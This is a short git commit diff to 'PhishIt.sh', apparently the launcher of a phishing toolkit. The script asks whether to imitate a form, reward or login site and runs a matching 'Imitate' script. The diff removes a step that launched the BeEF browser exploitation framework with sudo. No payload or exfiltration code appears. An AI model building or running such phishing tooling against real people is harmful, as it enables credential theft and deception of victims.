fbfa3db88703f36a88041f03715146a360bb9264
fastfir <95661133+fastfir@users.noreply.github.com>
2022-12-06 09:08:54 -0800

    Changed the python to shell scripts

--- PhishIt.sh
+++ PhishIt.sh
@@ -3,8 +3,6 @@ echo "\______   \  |__ |__| _____|  |__ |   |/  |_ "
 echo " |     ___/  |  \|  |/  ___/  |  \|   \   __\ "
 echo " |    |   |   Y  \  |\___ \|   Y  \   ||  | " 
 echo " |____|   |___|  /__/____  >___|  /___||__| " 
-cd beef
-sudo ./beef
 echo "What kind of website would you like to imitate? (Form,Reward,Login)"
 read type;
-python3 Imitate$type.py
+./Imitate$type.sh
